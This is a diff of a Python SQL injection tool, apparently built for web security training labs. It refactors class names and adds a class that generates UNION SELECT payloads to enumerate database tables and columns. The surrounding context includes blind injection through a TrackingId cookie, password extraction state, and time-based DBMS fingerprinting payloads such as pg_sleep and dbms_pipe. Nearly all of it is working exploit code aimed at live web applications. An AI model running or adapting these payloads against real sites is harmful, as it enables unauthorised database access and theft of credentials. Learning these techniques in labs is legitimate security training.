@@ -42,7 +42,7 @@ def show_text(url ,ses):
     print(url_response.text)
     print(url_response.cookies)
 
-class blind_inj:
+class BlindInj:
     def __init__(self, ses, url, dbms = "postgresql", cookie_name="TrackingId", charset = None):
         self.ses = ses
         self.url = url
@@ -54,7 +54,7 @@ class blind_inj:
         self.session_id = None
         self.found_password = ""
         self._init_cookies()
-        self.charset_upload()
+        self._charset_upload()
 
 
     def _init_cookies(self):
@@ -62,7 +62,7 @@ class blind_inj:
         self.tracking_id = response.cookies.get(self.cookie_name)
         self.session_id = response.cookies.get("session")
 
-    def charset_upload(self):
+    def _charset_upload(self):
         if self.charset is None:
             self.charset = CHAR_LIST
 
@@ -151,7 +151,7 @@ class blind_inj:
                 print("Can't find a letter")
                 break
 
-class union_table_recon:
+class UnionTableRecon:
     def __init__(self, url, ses, dbms = "postgresql"):
         self.url = url
         self.ses = ses
@@ -186,14 +186,14 @@ class union_table_recon:
             else:
                 print(f"Column {ind + 1} - Have string format")
 
-class dbms_verify_time_based:
+class DbmsVerifyTimeBased:
     def __init__(self, url, ses, delay=5, cookie_name="TrackingId"):
         self.url = url
         self.ses = ses
         self.delay = delay
         self.cookie_name = cookie_name
 
-    def make_payloads(self, base=""):
+    def _make_payloads(self, base=""):
         return {
             "Oracle":        f"{base}'||dbms_pipe.receive_message('', {self.delay})||'",
             "PostgreSQL":    f"{base}'||(SELECT pg_sleep({self.delay}))||'",
@@ -215,7 +215,7 @@ class dbms_verify_time_based:
 
     def url_sql_verify(self):
         print("[*] Testing URL parameter injection...")
-        for db, payload in self.make_payloads("").items():
+        for db, payload in self._make_payloads("").items():
             test_url = self.url + quote(payload, safe='')
             if self._test_payload(db, lambda: self.ses.get(test_url, timeout=self.delay+5)):
                 return db
@@ -232,7 +232,7 @@ class dbms_verify_time_based:
             print("[-] TrackingId cookie not found!")
             return None
 
-        for db, payload in self.make_payloads(tracking_id).items():
+        for db, payload in self._make_payloads(tracking_id).items():
             cookies_injection = {self.cookie_name: payload}
             if session_id:
                 cookies_injection["session"] = session_id
@@ -255,6 +255,50 @@ class dbms_verify_time_based:
         print("[-] Could not determine DBMS using Time-Based vectors.")
         return None
 
+class InformationSchema:
+    def __init__(self, url, ses, column_count=2, dbms="postgresql", target_column_idx=1):
+        self.url = url
+        self.ses = ses
+        self.column_count = column_count
+        self.dbms = dbms
+        self.target_column_idx = target_column_idx
+        self.comment = "-- " if self.dbms == "mysql" else "--"
+
+    def _fill_union_payload_with_nulls(self, select_expression):
+        items = ["NULL"] * self.column_count
+        idx = max(0, min(self.target_column_idx - 1, self.column_count - 1))
+        items[idx] = select_expression
+        return ", ".join(items)
+
+    def _tables_payload(self):
+        fill = self._fill_union_payload_with_nulls("table_name")
+        if self.dbms == "oracle":
+            return f"{self.url}' UNION SELECT {fill} FROM all_tables--"
+        else:
+            return f"{self.url}' UNION SELECT {fill} FROM information_schema.tables{self.comment}"
+
+    def _columns_payload(self, table_name='users'):
+        fill = self._fill_union_payload_with_nulls("column_name")
+        if self.dbms == "oracle":
+            return f"{self.url}' UNION SELECT {fill} FROM all_tab_columns WHERE table_name = '{table_name.upper()}'--"
+        else:
+            return f"{self.url}' UNION SELECT {fill} FROM information_schema.columns WHERE table_name = '{table_name}'{self.comment}"
+
+    def _get_dif_lines(self, injection_url):
+        base_response = self.ses.get(self.url)
+        inj_response = self.ses.get(injection_url)
+
+        base_lines = base_response.text.splitlines()
+        inj_lines = inj_response.text.splitlines()
+
+        diff = difflib.ndiff(base_lines, inj_lines)
+        return [line[2:].strip() for line in diff if line.startswith('+ ')]
+
+    def get_table(self):
+        return self._get_dif_lines(self._tables_payload())
+
+    def get_columns(self, table_name='users'):
+        return self._get_dif_lines(self._columns_payload(table_name))
 
 def cast_inj(ses, url):
 
@@ -276,35 +320,7 @@ def cast_inj(ses, url):
             print(f"Nothing found, check the payload or server response")
             print(response.text[:1000])
 
-def information_schema_table(ses, url):
-    response = ses.get(url)
-    text1 = response.text.splitlines()
-
-    injection = f"{url}' UNION SELECT table_name, NULL FROM information_schema.tables--"
-    injection_request = ses.get(injection)
-    text2 = injection_request.text.splitlines()
-
-    diff = difflib.ndiff(text1, text2)
-
-    for lines in diff:
-        if lines.startswith('+'):
-            print(lines)
-
-def information_schema_columns(ses, url):
-    response = ses.get(url)
-    text1 = response.text.splitlines()
-
-    injection = f"{url}' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_avhqsd'--"
-    injection_request = ses.get(injection)
-    text2 = injection_request.text.splitlines()
-
-    diff = difflib.ndiff(text1, text2)
-
-    for lines in diff:
-        if lines.startswith('+'):
-            print(lines)
-
 
 if __name__ == "__main__":
-    verifier = dbms_verify_time_based(base_url, session, delay=5)
+    verifier = DbmsVerifyTimeBased(base_url, session, delay=5)
     dbms = verifier.verify()
